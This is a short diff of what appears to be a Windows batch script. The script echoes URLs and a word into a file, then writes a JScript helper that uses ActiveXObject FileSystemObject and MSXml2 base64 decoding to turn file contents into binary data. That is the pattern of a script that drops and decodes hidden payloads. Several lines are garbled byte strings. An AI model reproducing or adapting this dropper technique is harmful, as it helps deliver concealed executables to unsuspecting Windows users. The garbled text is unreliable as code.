@@ -26,10 +26,10 @@ echo ‚710
 echo ‚710echo ‚710echo ‚710echo ‚710echo ‚710
 
 
-
+echo ???É%µhW³…o Ôf¹Ÿä???
 echo https://www.youtube.com/watch?v=uKO5uX34B4s>>x
 echo https://yyotther.wixsite.com/website-1>>x
-echo mysite>>x
+echo mywebsite>>x
 
 echo f=new ActiveXObject(^"Scripting.FileSystemObject^");i=f.getFile(^"x^").openAsTextStream();>x.js
 echo x=new ActiveXObject(^"MSXml2.DOMDocument^").createElement(^"Base64Data^");x.dataType=^"bin.base64^";>>x.js
